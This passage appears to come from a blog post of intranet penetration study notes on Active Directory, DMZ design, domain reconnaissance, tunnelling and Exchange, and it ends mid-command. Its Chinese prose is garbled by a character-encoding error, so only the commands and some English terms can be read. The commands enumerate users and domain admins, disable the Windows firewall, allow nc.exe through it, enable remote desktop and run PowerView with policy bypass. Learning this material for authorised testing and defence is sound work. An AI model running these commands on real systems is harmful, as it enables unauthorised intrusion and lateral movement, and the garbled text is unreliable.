ï¼Œæ›´å°‘çš„å®•æœºæ—¶é—´ã€‚å¦‚:åˆ©ç”¨ADæ§åˆ¶ç”¨æˆ·è®¿é—®æƒé™ï¼Œåˆ©ç”¨ç¾¤é›†ã€è´Ÿè½½å‡è¡¡ç­‰æŠ€æœ¯å¯¹æ–‡ä»¶æœåŠ¡å™¨è¿›è¡Œå®¹ç¾è®¾å®šï¼Œæ›´å¯é ï¼Œå®•æœºæ—¶é—´ å°‘ã€‚æ´»åŠ¨ç›®å½•ä¸ºMicrosoftç»Ÿä¸€ç®¡ç†çš„åŸºç¡€å¹³å°ï¼Œå…¶å®ƒisa,exchange,smsç­‰æœåŠ¡éƒ½ä¾èµ–äºè¿™ä¸ªåŸºç¡€å¹³å°ã€‚</p><p><strong>ADå’ŒDCåŒºåˆ«</strong></p><p>å¦‚æœç½‘ç»œè§„æ¨¡è¾ƒå¤§ï¼Œæˆ‘ä»¬å°±ä¼šè€ƒè™‘æŠŠç½‘ç»œä¸­çš„ä¼—å¤šå¯¹è±¡:è®¡ç®—æœºã€ç”¨æˆ·ã€ç”¨æˆ·ç»„ã€æ‰“å°æœºã€å…±äº«æ–‡ä»¶ç­‰ï¼Œåˆ†é—¨åˆ«ç±»ã€äº•ç„¶æœ‰åºåœ°æ”¾åœ¨ä¸€ä¸ªå¤§ä»“åº“ä¸­ï¼Œå¹¶åšå¥½æ£€ç´¢ä¿¡æ¯ï¼Œä»¥åˆ©äºæŸ¥æ‰¾ã€ç®¡ç†å’Œä½¿ç”¨è¿™äº›å¯¹è±¡ï¼ˆèµ„æºï¼‰ã€‚è¿™ä¸ªæœ‰å±‚æ¬¡ç»“æ„çš„æ•°æ®åº“ï¼Œå°±æ˜¯æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œç®€ç§°ADåº“ã€‚é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥æŠŠè¿™ä¸ªæ•°æ®åº“æ”¾åœ¨å“ªå°è®¡ç®—æœºä¸Šå‘¢?è§„å®šæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬æŠŠå­˜æ”¾æœ‰æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„è®¡ç®—æœºå°±ç§°ä¸ºDcã€‚æ‰€ä»¥è¯´æˆ‘ä»¬è¦å®ç°åŸŸç¯å¢ƒï¼Œå…¶å®å°±æ˜¯è¦å®‰è£…ADï¼Œå½“å†…ç½‘ä¸­çš„ä¸€å°è®¡ç®—æœºå®‰è£…äº†ADåï¼Œå®ƒå°±å˜æˆäº†DCã€‚</p><p><strong>å®‰å…¨åŸŸçš„åˆ’åˆ†</strong></p><p>å®‰å…¨åŸŸåˆ’åˆ†çš„ç›®çš„æ˜¯å°†ä¸€ç»„å®‰å…¨ç­‰çº§ç›¸åŒçš„è®¡ç®—æœºåˆ’å…¥åŒä¸€ä¸ªç½‘æ®µå†…ï¼Œè¿™ä¸€ç½‘æ®µå†…çš„è®¡ç®—æœºæ‹¥æœ‰ç›¸åŒçš„ç½‘ç»œè¾¹ç•Œï¼Œåœ¨ç½‘ç»œè¾¹ç•Œä¸Šé‡‡ç”¨é˜²ç«å¢™éƒ¨ç½²æ¥å®ç°å¯¹å…¶ä»–å®‰å…¨åŸŸçš„NACL(ç½‘ç»œè®¿é—®æ§åˆ¶ç­–ç•¥ï¼‰ï¼Œå…è®¸å“ªäº›IPè®¿é—®æ­¤åŸŸã€ä¸å…è®¸å“ªäº›è®¿é—®æ­¤åŸŸ;å…è®¸æ­¤åŸŸè®¿é—®å“ªäº›IP/ç½‘æ®µã€ä¸å…è®¸è®¿é—®å“ªäº›IP/ç½‘æ®µã€‚ä½¿å¾—å…¶é£é™©æœ€å°åŒ–ï¼Œå½“å‘ç”Ÿæ”»å‡»æ—¶å¯ä»¥å°†å¨èƒæœ€å¤§åŒ–çš„éš”ç¦»ï¼Œå‡å°‘å¯¹åŸŸå†…è®¡ç®—æœºçš„å½±å“ã€‚</p><p><strong>DMZ</strong></p><p>DMZç§°ä¸ºâ€œéš”ç¦»åŒºâ€ï¼Œä¹Ÿç§°â€œéå†›äº‹åŒ–åŒºâ€ã€‚æ˜¯ä¸ºäº†è§£å†³å®‰è£…é˜²ç«å¢™åå¤–éƒ¨ç½‘ç»œä¸èƒ½è®¿é—®å†…éƒ¨ç½‘ç»œæœåŠ¡å™¨çš„é—®é¢˜ï¼Œè€Œè®¾ç«‹çš„ä¸€ä¸ªéå®‰å…¨ç³»ç»Ÿä¸å®‰å…¨ç³»ç»Ÿä¹‹é—´çš„ç¼“å†²åŒºã€‚<br>è¿™ä¸ªç¼“å†²åŒºä½äºä¼ä¸šå†…éƒ¨ç½‘ç»œå’Œå¤–éƒ¨ç½‘ç»œä¹‹é—´çš„å°ç½‘ç»œåŒºåŸŸå†…ï¼Œåœ¨è¿™ä¸ªå°ç½‘ç»œåŒºåŸŸå†…å¯ä»¥æ”¾ç½®ä¸€äº›å¿…é¡»å…¬å¼€çš„æœåŠ¡å™¨è®¾æ–½ï¼Œå¦‚ä¼ä¸šWebæœåŠ¡å™¨ã€FTPæœåŠ¡å™¨å’Œè®ºå›ç­‰ã€‚<br>å¦ä¸€æ–¹é¢ï¼Œé€šè¿‡è¿™æ ·ä¸€ä¸ªDMzåŒºåŸŸï¼Œæ›´åŠ æœ‰æ•ˆåœ°ä¿æŠ¤äº†å†…éƒ¨ç½‘ç»œï¼Œå› ä¸ºè¿™ç§ç½‘ç»œéƒ¨ç½²ï¼Œæ¯”èµ·ä¸€èˆ¬çš„é˜²ç«å¢™æ–¹æ¡ˆï¼Œå¯¹æ”»å‡»è€…æ¥è¯´åˆå¤šäº†ä¸€é“å…³å¡ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628103312842.png" alt="image-20220628103312842"></p><p><strong>DMZå±éšœåŠŸèƒ½</strong></p><p>(1) å†…ç½‘å¯ä»¥è®¿é—®å¤–ç½‘<br>å†…ç½‘çš„è§’æˆ·éœ€è¦è‡ªç”±åœ°è®¿é—®å¤–ç½‘ã€‚åœ¨è¿™ä¸€ç­–ç•¥ä¸­ï¼Œé˜²ç«å¢™éœ€è¦æ‰§è¡ŒNATã€‚</p><p>(2) å†…ç½‘å¯ä»¥è®¿é—®DMZ<br>æ­¤ç­–ç•¥ä½¿å†…ç½‘ç”¨æˆ·å¯ä»¥ä½¿ç”¨æˆ–è€…ç®¡ç†DMZä¸­çš„æœåŠ¡å™¨ã€‚</p><p>(3) å¤–ç½‘ä¸èƒ½è®¿é—®å†…ç½‘<br>è¿™æ˜¯é˜²ç«å¢™çš„åŸºæœ¬ç­–ç•¥äº†ï¼Œå†…ç½‘ä¸­å­˜æ”¾çš„æ˜¯å…¬å¸å†…éƒ¨æ•°æ®ï¼Œæ˜¾ç„¶è¿™äº›æ•°æ®æ˜¯ä¸å…è®¸å¤–ç½‘çš„ç”¨æˆ·è¿›è¡Œè®¿é—®çš„ã€‚å¦‚æœè€è®¿é—®ï¼Œå°±è¦é€šè¿‡VPNæ–¹å¼æ¥è¿›è¡Œã€‚</p><p>(4) å¤–ç½‘å¯ä»¥è®¿é—®DMZ<br>DMZä¸­çš„æœåŠ¡å™¨éœ€è¦ä¸ºå¤–ç•Œæä¾›æœåŠ¡ï¼Œæ‰€ä»¥å¤–ç½‘å¿…é¡»å¯ä»¥è®¿é—®DMZã€‚åŒæ—¶ï¼Œå¤–ç½‘è®¿é—®DMZéœ€è¦ç”±é˜²ç«å¢™å®Œæˆå¯¹å¤–åœ°å€åˆ°æœåŠ¡å™¨å®é™…åœ°å€çš„è½¬æ¢ã€‚</p><p>(5) DMZä¸èƒ½è®¿é—®å†…ç½‘<br>å¦‚ä¸æ‰§è¡Œæ­¤ç­–ç•¥ï¼Œåˆ™å½“å…¥ä¾µè€…æ”»é™·DMZæ—¶ï¼Œå†…éƒ¨ç½‘ç»œå°†ä¸ä¼šå—ä¿æŠ¤ã€‚</p><p>(6ï¼‰DMZä¸èƒ½è®¿é—®å¤–ç½‘<br>æ­¤æ¡ç­–ç•¥ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œåœ¨DMZä¸­æ”¾ç½®é‚®ä»¶æœåŠ¡å™¨æ—¶ï¼Œå°±éœ€è¦è®¿é—®å¤–ç½‘ï¼Œå¦åˆ™å°†ä¸èƒ½æ­£å¸¸å·¥ä½œã€‚</p><p><strong>åŸŸä¸­è®¡ç®—æœºåˆ†ç±»</strong></p><p>åŸŸæ§åˆ¶å™¨-æˆå‘˜æœåŠ¡å™¨-å®¢æˆ·æœº-ç‹¬ç«‹æœåŠ¡å™¨</p><p>åŸŸæ§åˆ¶å™¨æ˜¯å­˜æ”¾æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„ï¼Œæ˜¯åŸŸä¸­å¿…é¡»è¦æœ‰çš„ï¼Œè€Œå…¶ä»–ä¸‰ç§åˆ™ä¸æ˜¯å¿…é¡»çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ç®€å•çš„åŸŸå¯ä»¥åªåŒ…å«ä¸€å°è®¡ç®—æœºï¼Œè¿™å°è®¡ç®—æœºå°±æ˜¯è¯¥åŸŸçš„åŸŸæ§åˆ¶å™¨ã€‚<br>åŸŸä¸­å„ä¸ªæœåŠ¡å™¨çš„è§’è‰²ä¹Ÿæ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œä¾‹å¦‚åŸŸæœåŠ¡å™¨åœ¨åˆ é™¤æ´»åŠ¨ç›®å½•æ—¶ï¼Œå¦‚æœæ˜¯åŸŸä¸­æœ€åä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œåˆ™è¯¥åŸŸæœåŠ¡å™¨ä¼šæˆä¸ºç‹¬ç«‹æœåŠ¡å™¨ï¼Œå¦‚æœä¸æ˜¯åŸŸä¸­å”¯ä¸€çš„åŸŸæ§åˆ¶å™¨ï¼Œåˆ™å°†ä½¿è¯¥æœåŠ¡å™¨æˆä¸ºæˆå‘˜æœåŠ¡å™¨ã€‚åŒæ—¶ç‹¬ç«‹æœåŠ¡å™¨æ—¢å¯ä»¥è½¬æ¢ä¸ºåŸŸæ§åˆ¶å™¨ï¼Œä¹Ÿå¯ä»¥åŠ å…¥åˆ°æŸä¸ªåŸŸæˆä¸ºæˆå‘˜æœåŠ¡å™¨ã€‚</p><p><strong>å†…æƒé™è§£è¯»:</strong></p><p><strong>åŸŸæœ¬åœ°ç»„</strong>ï¼Œå¤šåŸŸç”¨æˆ·è®¿é—®å•åŸŸèµ„æºï¼ˆè®¿é—®åŒä¸€ä¸ªåŸŸ)ã€‚å¯ä»¥ä»ä»»ä½•åŸŸæ·»åŠ ç”¨æˆ·è´¦æˆ·ã€é€šç”¨ç»„å’Œå…¨å±€ç»„ï¼Œåªèƒ½åœ¨å…¶æ‰€åœ¨åŸŸå†…æŒ‡æ´¾æƒé™ã€‚åŸŸæœ¬åœ°ç»„ä¸èƒ½åµŒå¥—äºå…¶ä»–ç»„ä¸­ã€‚å®ƒä¸»è¦æ˜¯ç”¨äºæˆäºˆä½äºæœ¬åŸŸèµ„æºçš„è®¿é—®æƒé™</p><p><strong>å…¨å±€ç»„</strong>ï¼Œå•åŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æºï¼ˆå¿…é¡»æ˜¯åŒä¸€ä¸ªåŸŸé‡Œé¢çš„ç”¨æˆ·ï¼‰ã€‚åªèƒ½åœ¨åˆ›å»ºè¯¥å…¨å±€ç»„çš„åŸŸä¸Šè¿›è¡Œæ·»åŠ ç”¨æˆ·å’Œå…¨å±€ç»„ï¼Œå¯ä»¥åœ¨åŸŸæ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå…¨å±€ç»„å¯ä»¥åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ã€‚</p><p><strong>é€šç”¨ç»„</strong>ï¼Œé€šç”¨ç»„æˆå‘˜æ¥è‡ªåŸŸæ—ä¸­ä»»ä½•åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ã€å…¨å±€ç»„å’Œå…¶ä»–çš„é€šç”¨ç»„ï¼Œå¯ä»¥åœ¨è¯¥åŸŸæ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå¯ä»¥åµŒå¥—äºå…¶ä»–åŸŸç»„ä¸­ã€‚éå¸¸é€‚äºåŸŸæ—ä¸­çš„è·¨åŸŸè®¿é—®ã€‚</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628104718578.png" alt="image-20220628104718578"></p><p><strong>A-G-DL-Pç­–ç•¥</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628154433781.png" alt="image-20220628154433781"></p><p><strong>æœ¬åœ°åŸŸç»„çš„æƒé™</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155157050.png" alt="image-20220628155157050"></p><p><strong>å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155303297.png" alt="image-20220628155303297"></p><h2 id="å†…ç½‘ä¿¡æ¯æœé›†"><a href="#å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æœé›†"></a>å†…ç½‘ä¿¡æ¯æœé›†</h2><p><strong>å·¥ä½œç»„ä¿¡æ¯æœé›†</strong></p><p><strong>æœ¬æœºä¿¡æ¯æ”¶é›†</strong></p><p>æŸ¥è¯¢ç½‘ç»œé…ç½®</p><pre><code>ipconfig /all</code></pre><p>æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</p><pre><code>net usernet localgroup administratorsquery user ||qwinsta æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</code></pre><p>æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</p><pre><code>tasklist /vwmic process list brief</code></pre><p>æŸ¥è¯¢æ“ä½œç³»ç»ŸåŠå®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯</p><pre><code>è·å–æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯systeminfoæŸ¥çœ‹å®‰è£…è½¯ä»¶ä»¥åŠç‰ˆæœ¬è·¯å¾„wmic product name,versionpowershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></pre><p>æŸ¥è¯¢ç«¯å£åˆ—è¡¨</p><pre><code>netstat -ano</code></pre><p>æŸ¥è¯¢è¡¥ä¸åˆ—è¡¨</p><pre><code>systeminfoWmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><p>æŸ¥è¯¢æœ¬æœºå…±äº«</p><pre><code>net sharewmic share get name,path,status</code></pre><p>æŸ¥è¯¢é˜²ç«å¢™é…ç½®</p><pre><code>æŸ¥çœ‹é˜²ç«å¢™é…ç½®:netsh firewall show configå…³é—­é˜²ç«å¢™:Windows server 2003ç³»ç»ŸåŠå…¶ä»¥å‰ï¼šnetsh firewall set opmode disableWindows server 2003ä»¥åç³»ç»Ÿç‰ˆæœ¬ï¼šnetsh advfirewall set allprofiles state offä¿®æ”¹é˜²ç«å¢™é…ç½®windows server 2003ç³»ç»ŸåŠä¹‹å‰ç‰ˆæœ¬ï¼Œå…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥:netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enablewindows server 2003ä¹‹åç³»ç»Ÿç‰ˆæœ¬:å…è®¸æŒ‡å®šç¨‹åºæ¥å…¥netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;å…è®¸æŒ‡å®šç¨‹åºè¿å‡ºnetsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;å…è®¸3389ç«¯å£æ”¾è¡Œnetsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow </code></pre><p>æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡</p><pre><code>æŸ¥è¯¢è¿œç¨‹è¿æ¥ç«¯å£Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumberwindows server 2008å’Œwindows server 2012å¼€å¯3389æ–¹æ³•(win7åªå¯ä»¥ç”¨å‰ä¸¤æ¡):wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1  wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fwindows server 2003å’Œwindows xp:wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1ä»¥ä¸Šå‰ææ¡ä»¶æ˜¯ç¡®ä¿Windows Management Instrumentationï¼ˆWinmgmtï¼‰æœåŠ¡å·²æ­£å¸¸å¯åŠ¨ï¼Œæƒé™çš„è¯éœ€è¦administratoråŠä»¥ä¸Š</code></pre><p>æŸ¥è¯¢å½“å‰æƒé™</p><pre><code>whoami whoami /all #è·å–åŸŸSIDnet user XXX /domain è·å–æŒ‡å®šè´¦æˆ·çš„è¯¦ç»†ä¿¡æ¯</code></pre><p>åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ</p><pre><code>ipconfig /allsysteminfonet config workstationnet time /domain1.å­˜åœ¨åŸŸï¼Œå½“å‰ä¸æ˜¯åŸŸç”¨æˆ·2.å­˜åœ¨åŸŸï¼Œå½“å‰æ˜¯åŸŸç”¨æˆ·3.ä¸å­˜åœ¨åŸŸ</code></pre><p><strong>åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹</strong></p><p><strong>1.åˆ©ç”¨NetBIOSå¿«é€Ÿæ¢æµ‹å†…ç½‘</strong></p><p>å·¥å…·:Nbtscan</p><p>ä½¿ç”¨æ–¹æ³•:nbtscan.exe IP</p><p><strong>2.åˆ©ç”¨icmpæ¢æµ‹å†…ç½‘</strong></p><pre><code>for /L %l in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%l | findstr &quot;TTL=&quot;</code></pre><p><strong>3.åˆ©ç”¨arpæ‰«æå®Œæ•´æ¢æµ‹å†…ç½‘</strong></p><p>1.arp-scan</p><p>2.Invoke-ARPScan.ps1</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220630100231019.png" alt="image-20220630100231019"></p><p><strong>4.åˆ©ç”¨å¸¸è§„tcp/udpç«¯å£æ‰«ææ¢æµ‹å†…ç½‘</strong></p><p>å·¥å…·:scanline</p><pre><code>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt  -p 192.168.4.1-254 /b</code></pre><p><strong>åŸŸå†…ç«¯å£æ‰«æ</strong></p><p><strong>1.telnetæ¢æµ‹</strong></p><pre><code>telnet ip ç«¯å£</code></pre><p><strong>2.Sæ‰«æå™¨</strong></p><pre><code>S.exe TCP 192.168.1.1192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111256 /Banner /save</code></pre><p><strong>åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†</strong></p><pre><code>net view /domainnet view /domain:XXXnet group /domainnet group &quot;domain computers&quot; /domainnet accounts /domainnltest /domain_trusts</code></pre><p><strong>åŸŸå†…æ§åˆ¶å™¨çš„æŸ¥æ‰¾</strong></p><pre><code>nltest /DCLIST:XXXNslookup -type=SRV _ldap._tcpnet time /domainnet group &quot;Domain Controllers&quot; /domainnetdom query pdc</code></pre><p><strong>åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜</strong></p><pre><code>æŸ¥è¯¢æ‰€æœ‰åŸŸç”¨æˆ·åˆ—è¡¨net user /domainwmic useraccount get /alldsquery usernet localgroup administrators /domainæŸ¥è¯¢åŸŸç®¡ç†å‘˜ç”¨æˆ·ç»„net group &quot;domain admins&quot; /domainnet group &quot;Enterprise Admins&quot; /domain</code></pre><p><strong>æŸ¥æ‰¾åŸŸç®¡ç†è¿›ç¨‹</strong></p><p><strong>1.æœ¬æœºæ£€æŸ¥</strong></p><ul><li>è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨ A,B,C</li><li>æŸ¥çœ‹æœ¬æœºæ‰€æœ‰è¿›ç¨‹</li><li>äº¤å‰</li></ul><pre><code>1.è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨net group &quot;Domain Admins&quot; /domain2.åˆ—å‡ºæœ¬æœºæ‰€æœ‰è¿›ç¨‹åŠè¿›ç¨‹ç”¨æˆ·tasklist /v3.å¯»æ‰¾æ˜¯å¦æœ‰è¿›ç¨‹æ‰€æœ‰è€…ä½åŸŸç®¡ç†å‘˜çš„è¿›ç¨‹</code></pre><p><strong>2.æŸ¥è¯¢åŸŸæ§åˆ¶å™¨çš„åŸŸç”¨æˆ·ä¼šè¯</strong></p><pre><code>1.æ”¶é›†åŸŸæ§åˆ¶å™¨çš„åˆ—è¡¨net group &quot;Domain Controllers&quot; /domain2.æ”¶é›†åŸŸç®¡ç†å‘˜çš„åˆ—è¡¨net group &quot;Domain Admins&quot; /domain3.ä½¿ç”¨Netsess.exeæŸ¥è¯¢æ¯ä¸ªåŸŸæ§åˆ¶å™¨æ”¶é›†æ‰€æœ‰æ´»åŠ¨åŸŸä¼šè¯çš„åˆ—è¡¨Netsess.exe -h4.å°†åŸŸç®¡ç†å‘˜åˆ—è¡¨ä¸æ´»åŠ¨ä¼šè¯åˆ—è¡¨äº¤å‰å¼•ç”¨ï¼Œä»¥ç¡®å®šå“ªäº›IPåœ°å€å…·æœ‰æ´»åŠ¨åŸŸä»¤ç‰Œã€‚</code></pre><p><strong>3.æ‰«æè¿œç¨‹ç³»ç»Ÿä¸Šè¿è¡Œçš„ä»»åŠ¡</strong></p><pre><code>1.æ”¶é›†åŸŸç®¡ç†å‘˜çš„åˆ—è¡¨net group &quot;Domain Admins&quot; /domain3.è¿è¡Œè„šæœ¬FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</code></pre><p><strong>4.æ‰«æè¿œç¨‹ç³»ç»Ÿä¸Šçš„NetBIOSä¿¡æ¯</strong></p><pre><code>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</code></pre><p><strong>PowerShellæ”¶é›†åŸŸä¿¡æ¯</strong></p><p>PowerShellç‰ˆæœ¬</p><ul><li>2.0 win2008,win7</li><li>3.0 win2012,win8</li><li>4.0 win2012R2,win8.1</li><li>5.0 win2016,win10</li></ul><p>PowerShellç­–ç•¥</p><pre><code>Restricted #ä¸èƒ½æ‰§è¡Œä»»ä½•è„šæœ¬Allsigned #åªå…è®¸æ‰§è¡Œæ­£è§„ç­¾åçš„è„šæœ¬Unrestricted #æ‰§è¡Œä»»æ„è„šæœ¬RemoteSigned #æœ¬æœºæ‰§è¡Œè„šæœ¬ä¸å—é™åˆ¶ï¼Œæ‰§è¡Œè¿œç¨‹è„šæœ¬ï¼Œå¿…é¡»ç»è¿‡ç­¾å</code></pre><p>ä¿®æ”¹ç­–ç•¥</p><pre><code>Get-Executionpolicy  #æŸ¥çœ‹å½“å‰ç­–ç•¥Set-Executionpolicy Unrestricted # ä¿®æ”¹ç­–ç•¥</code></pre><p><strong>ä½¿ç”¨Powerviewè¿›è¡Œä¿¡æ¯æœé›†</strong></p><pre><code>-exec bypassImport-Module.\PowerView.ps1</code></pre><p>å¸¸ç”¨å‘½ä»¤:</p><pre><code>Import-Moduleä¸ºpowershellå¯¼å…¥è„šæœ¬å‘½ä»¤ï¼Œè¿™é‡Œå‡è®¾æˆ‘ä»¬ä¸‹è½½çš„powerview.ps1è„šæœ¬åœ¨C:\PowerView.ps1å‘½ä»¤æ ¼å¼ï¼špowershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerviewçš„å‘½ä»¤å‚æ•°&#125;&quot; å®šä½åŸŸç®¡ç†å‘˜powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; Invoke-UserHunter&#125;&quot; æ›´å¤šPowerViewå‘½ä»¤å‚æ•°Get-NetDomain: è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§°Get-NetUser: è·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯Get-NetDomainController: è·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯Get-NetComputer: è·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯Get-NetOU: è·å–åŸŸä¸­çš„OUä¿¡æ¯Get-NetGroup: è·å–æ‰€æœ‰åŸŸå†…ç»„å’Œç»„æˆå‘˜ä¿¡æ¯Get-NetFileServer: æ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯Get-NetShare: è·å–å½“å‰åŸŸå†…æ‰€æœ‰ç½‘ç»œå…±äº«ä¿¡æ¯Get-NetSession: è·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯Get-NetRDPSession: è·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥Get-NetProcess: è·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹Get-UserEvent: è·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—Get-ADObiect: è·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡Get-NetGPO: è·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡Get-DomainPolicy: è·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥Invoke-UserHunter: è·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™Invoke-ProcessHunter: é€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·Invoke-UserEvenHunter: æ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›åŸŸæœºå™¨ã€‚</code></pre><h2 id="éšè—é€šä¿¡éš§é“æŠ€æœ¯"><a href="#éšè—é€šä¿¡éš§é“æŠ€æœ¯" class="headerlink" title="éšè—é€šä¿¡éš§é“æŠ€æœ¯"></a>éšè—é€šä¿¡éš§é“æŠ€æœ¯</h2><p>ç½‘ç»œå±‚éš§é“:</p><ul><li><p>IPv6éš§é“</p></li><li><p>ICMPéš§é“ (ping ip)</p></li></ul><p>ä¼ è¾“å±‚éš§é“:</p><ul><li>TCP (nc ip port)</li><li>UDP</li></ul><p>åº”ç”¨å±‚éš§é“:</p><ul><li>SSH</li><li>HTTP(curl ip:port)</li><li>DNS(nslookup <a href="http://www.baidu.com/">www.baidu.com</a> vps-ip)(dig @vps-ip <a href="http://www.baidu.com/">www.baidu.com</a>)</li></ul><p><strong>ICMPéš§é“</strong></p><p>ICMPéš§é“å·¥å…·æœ‰ï¼šPingTunnelã€icmptunnelã€icmpshã€powershellã€icmpç­‰</p><h2 id="æ¨ªå‘æ¸—é€"><a href="#æ¨ªå‘æ¸—é€" class="headerlink" title="æ¨ªå‘æ¸—é€"></a>æ¨ªå‘æ¸—é€</h2><p>exchangeé‚®ä»¶æœåŠ¡å™¨</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220701171227982.png" alt="image-20220701171227982"></p><p>å®¢æˆ·ç«¯/è¿œç¨‹è®¿é—®æ¥å£å’Œåè®®</p><ul><li>OWA</li><li>ECP</li><li>EWS</li></ul><p>åŸºäºç«¯å£æ‰«æå‘ç°:</p><ul><li>25ç«¯å£ SMTPçš„æŒ‡çº¹æ˜¾ç¤ºä¸ºExchange smtpd</li><li>80ç«¯å£ä¸º iis 8.5</li><li>443ç«¯å£</li></ul><p>SPNæŸ¥è¯¢</p><ul><li><pre><code>setspn -T pentest.com -F -Q */*</code></pre></li></ul><p><strong>ExchangeåŸºæœ¬æ“ä½œ</strong></p><p>æŸ¥çœ‹Mailboxæ•°æ®åº“</p><ul><li><pre><code>Get-MailboxDatabase -server &quot;Exchange1&quot;</code></pre></li><li><pre><code>add-pssnapin 